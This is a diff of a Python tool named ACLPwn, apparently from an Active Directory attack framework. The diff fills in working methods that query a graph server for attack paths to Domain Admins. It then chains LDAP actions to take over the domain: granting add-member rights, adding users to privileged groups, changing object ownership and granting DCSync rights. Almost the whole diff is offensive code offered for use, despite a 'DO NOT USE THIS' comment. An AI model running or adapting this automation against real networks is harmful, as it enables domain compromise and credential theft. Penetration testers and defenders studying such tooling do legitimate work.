@@ -1,3 +1,9 @@
+# Word of advice: DO NOT USE THIS
+# 
+# 
+# 
+# 
+
 import asyncio
 import json
 import traceback
@@ -29,6 +35,45 @@ class ACLPwn:
 	def get_smb(self):
 		return SMBConnectionURL(self.smb_url)
 
+	async def get_start_user_sid(self):
+		try:
+			print('Determining start user SID')
+			if self.start_user_sid is not None:
+				return self.start_user_sid, None
+			
+			domain_ids = []
+			ldap_creds = self.get_ldap().get_credential()
+			smb_creds = self.get_smb().get_credential()
+
+			async with aiohttp.ClientSession() as session:
+				async with session.get('%s/graph/%s/getdomainids/' % (self.jd_url, self.graph_id)) as resp:
+					if resp.status != 200:
+						raise Exception('Failed to query domain IDs! Status: %s' % resp.status)
+					domain_ids_raw = await resp.text()
+					domain_ids = json.loads(domain_ids_raw)
+					if len(domain_ids) == 0:
+						raise Exception('No domain ID belogns to this graph?!')
+			
+			for proto, username in [('LDAP', ldap_creds.username), ('SMB', smb_creds.username)]:
+				async with aiohttp.ClientSession() as session:
+					for domain_id in domain_ids:
+						async with session.get('%s/user/%s/by_samaccountname/%s' % (self.jd_url, domain_id, username)) as resp:
+							if resp.status not in [200, 204]:
+								raise Exception('Failed to search for username in database! Status: %s' % resp.status)
+							if resp.status == 204:
+								print('Not found in doimain id %s' % domain_id)
+								continue
+							if resp.status == 200:
+								data = await resp.text()
+								user = json.loads(data)
+								self.start_user_sid = user['objectSid']
+								print('Found current user using proto %s! SID: %s' % (proto, self.start_user_sid))
+								return self.start_user_sid, None
+			
+			return None, Exception('User not found in database!')
+		except Exception as e:
+			return None, e
+
 	async def load_graph(self):
 		try:
 			print('Asking server to load graph data to memory...')
@@ -37,6 +82,7 @@ class ACLPwn:
 					if resp.status != 200:
 						raise Exception('Loading graphid failed! Status: %s' % resp.status)
 					await resp.text()
+					print('Graph data loaded!')
 
 			self.is_graph_loaded = True
 			return True, None
@@ -57,20 +103,22 @@ class ACLPwn:
 		
 	async def get_path(self, src_sid, dst_sid, exclude = ['hasSession']):
 		try:
+			print('Asking for paths from user %s to the DA group' % src_sid)
 			url = '%s/graph/%s/query/path?src=%s&dst=%s&format=%s' % (self.jd_url,self.graph_id, src_sid, dst_sid, 'path')
 			if len(exclude) > 0:
 				exclude = '%2C'.join(exclude)
 			url += '&exclude=%s' % exclude
-			print(url)
 			async with aiohttp.ClientSession() as session:
 				async with session.get(url) as resp:
-					print(resp.status)
 					if resp.status != 200:
 						raise Exception('Loading graphid failed! Status: %s' % resp.status)
 					data = await resp.text()
-			print(data)
 			res = json.loads(data)
-			pprint.pprint(res)
+			if len(res) != 0:
+				print('Got PATH to DA!')
+				pprint.pprint(res)
+			else:
+				print('Server could not find a way to DA :(')
 			return res, None
 		except Exception as e:
 			return False, e
@@ -79,11 +127,9 @@ class ACLPwn:
 		try:
 			async with aiohttp.ClientSession() as session:
 				async with session.get('%s/graph/%s/getdomainsids/' % (self.jd_url,self.graph_id)) as resp:
-					print(resp.status)
 					if resp.status != 200:
 						raise Exception('Loading graphid failed! Status: %s' % resp.status)
 					body = await resp.text()
-					print(body)
 					self.domainsids = json.loads(body)
 			
 			for dsid in self.domainsids:
@@ -101,11 +147,9 @@ class ACLPwn:
 				#http://127.0.0.1:5000/group/1/by_sid/S-1-5-21-4136613964-2812260436-2179565534-2643
 				async with aiohttp.ClientSession() as session:
 					async with session.get('%s/%s/%s/by_sid/%s' % (self.jd_url, stype, self.graph_id, sid)) as resp:
-						print(resp.status)
 						if resp.status != 200:
 							raise Exception('Loading graphid failed! Status: %s' % resp.status)
 						body = await resp.text()
-						print(body)
 						self.objcache[sid] = json.loads(body)
 			
 			return self.objcache[sid], None
@@ -160,6 +204,33 @@ class ACLPwn:
 		except Exception as e:
 			print('Failed to change password for user %s' % user_dn)
 			return False, e
+
+	async def add_addmember_privs(self, src_sid, dst_sid, ad_id = 1):
+		try:
+			
+			user_dn, err = await self.get_dn(src_sid, 'user', ad_id)
+			if err is not None:
+				raise err
+
+			group_dn, err = await self.get_dn(dst_sid, 'group', ad_id)
+			if err is not None:
+				raise err
+
+			ldapclient = self.get_ldap().get_client()
+			print('Adding addmember privs to user %s \'s on group %s' % (user_dn, group_dn))
+			_, err = await ldapclient.connect()
+			if err is not None:
+				raise err
+			
+			_, err = await ldapclient.add_priv_addmember(user_dn, group_dn)
+			if err is not None:
+				raise err
+			
+			print('User granted addmember privileges!')
+
+		except Exception as e:
+			print('Failed to add addmember privilege to %s' % group_dn)
+			return False, e
 	
 	async def add_user_to_group(self, src_sid, dst_sid, ad_id = 1):
 		try:
@@ -187,36 +258,61 @@ class ACLPwn:
 		except Exception as e:
 			print('Failed to add user %s to group %s' % (user_dn, group_dn))
 			return False, e
-	
-	async def genericall_user(self):
-		#password reset
-		pass
 
-	async def genericall_group(self):
-		#add user to group
-		pass
-	
-	#genericall/genericwrite/write on computer: resource based constrained
+	async def write_owner(self, src_sid, dst_sid, dst_type, ad_id = 1):
+		try:
+			
+			user_dn, err = await self.get_dn(src_sid, 'user', ad_id)
+			if err is not None:
+				raise err
+			
+			group_dn, err = await self.get_dn(dst_sid, dst_type, ad_id)
+			if err is not None:
+				raise err
 
-	async def writeproperty_group(self):
-		#add user to group
-		pass
+			ldapclient = self.get_ldap().get_client()
+			print('Changing Owner of %s (%s) to %s' % (group_dn, dst_type, user_dn))
+			_, err = await ldapclient.connect()
+			if err is not None:
+				raise err
+			
+			_, err = await ldapclient.change_priv_owner(src_sid, group_dn)
+			if err is not None:
+				raise err
+			
+			print('Object owner changed!')
 
-	async def self_group(self):
-		#add user to group
-		pass
-	
-	async def writeowner_group(self):
-		#change the owner of the group to the given user
-		pass
+		except Exception as e:
+			print('Failed to change ownership of object %s (%s) to user %s' % (group_dn, dst_type ,user_dn))
+			return False, e
 
-	async def genericwrite_user(self):
-		# can change some attributes, scriptpath attr will load a script on next logon to the user
-		pass
+	async def add_domain_sync(self, src_sid, dst_sid, ad_id = 1):
+		try:
+			
+			user_dn, err = await self.get_dn(src_sid, 'user', ad_id)
+			if err is not None:
+				raise err
+			
+			forest_dn, err = await self.get_dn(dst_sid, 'domain', ad_id)
+			if err is not None:
+				raise err
 
-	async def add_dcsync(self, user_dn):
-		#assigns dcsync rights to the given user
-		pass
+			ldapclient = self.get_ldap().get_client()
+			print('Adding DcSync rights to user %s' % user_dn)
+			_, err = await ldapclient.connect()
+			if err is not None:
+				raise err
+			
+			_, err = await ldapclient.add_priv_dcsync(self, user_dn, forest_dn)
+			if err is not None:
+				raise err
+			
+			print('User got DcSync rights!')
+
+		except Exception as e:
+			print('Failed to add DcSync rights to user %s' % user_dn)
+			return False, e
+
 
 	async def build_chain(self, paths):
 		try:
@@ -280,13 +376,11 @@ class ACLPwn:
 						if dst_type == 'group':
 							if atype in ['writedacl', 'owns']:
 								#add_addmember_privs
-								#actions.append(self.add_user_to_group(src_sid, dst_sid))
-								print('1111111111111111')
+								actions.append(self.add_addmember_privs(src_sid, dst_sid))
 							actions.append(self.add_user_to_group(src_sid, dst_sid))
 						
 						elif dst_type == 'domain':
-							print('22222222222222')
-							#actions.append(self.add_user_to_group(src_sid, dst_sid))
+							actions.append(self.add_domain_sync(src_sid, dst_sid))
 
 						else:
 							print('Action %s not supported on %s' % (atype, dst_type))
@@ -294,22 +388,28 @@ class ACLPwn:
 
 					elif atype == 'writeowner':
 						if dst_type == 'group':
-							actions.append(self.write_owner(src_sid, dst_sid))
+							actions.append(self.write_owner(src_sid, dst_sid, 'group'))
 							actions.append(self.add_addmember_privs(src_sid, dst_sid))
 							actions.append(self.add_user_to_group(src_sid, dst_sid))
 
 						elif dst_type == 'domain':
-							print('22222222222222')
-							#actions.append(self.write_owner(src_sid, dst_sid))
-							#actions.append(self.add_domain_sync(src_sid, dst_sid))
-							#
-
+							actions.append(self.write_owner(src_sid, dst_sid, 'domain'))
+							actions.append(self.add_domain_sync(src_sid, dst_sid))
 						else:
 							print('Action %s not supported on %s' % (atype, dst_type))
 							break
-
 					
-	
+					#elif atype == 'adminto':
+					#	if dst_type == 'domain':
+					#		actions.append(self.dump_creds(src_sid, dst_sid))
+					#	else:
+					#		print('Action %s not supported on %s' % (atype, dst_type))
+					#		break
+					
+					else:
+						print('Action %s not supported on %s' % (atype, dst_type))
+						break
+					
 				else:
 					selected_actions = actions
 
@@ -342,19 +442,24 @@ class ACLPwn:
 				if err is not None:
 					raise err
 			
-			if self.start_user_sid is not None:
-				paths = []
-				for dasid in self.dagroups:
-					res, err = await self.get_path(self.start_user_sid, dasid)
-					if err is not None:
-						raise err
-					paths += res
-
-
-			else:
-				paths, err = await self.get_path_owned_da()
+			_, err = await self.get_start_user_sid()
+			if err is not None:
+				raise err
+				
+			paths = []
+			for dasid in self.domainsids: #self.dagroups:
+				res, err = await self.get_path(self.start_user_sid, dasid)
 				if err is not None:
 					raise err
+				paths += res
+
+			if len(paths) == 0:
+				raise Exception('No paths to DA!')
+
+			#else:
+			#	paths, err = await self.get_path_owned_da()
+			#	if err is not None:
+			#		raise err
 				
 			chain, err = await self.build_chain(paths)
 			if err is not None:
@@ -372,9 +477,9 @@ def main():
 	import argparse
 
 	parser = argparse.ArgumentParser(description='acl autopwn')
-	parser.add_argument('url', default='http://127.0.0.1:5000', help = 'server listen ip')
 	parser.add_argument('ldapurl', help = 'server listen port')
 	parser.add_argument('smburl', help = 'server listen ip')
+	parser.add_argument('url', default='http://127.0.0.1:5000', help = 'server listen ip')
 	parser.add_argument('graphid', default = 1, type=int, help = 'graphid')
 	parser.add_argument('-u', '--user-sid', help = 'Start user SID')
 
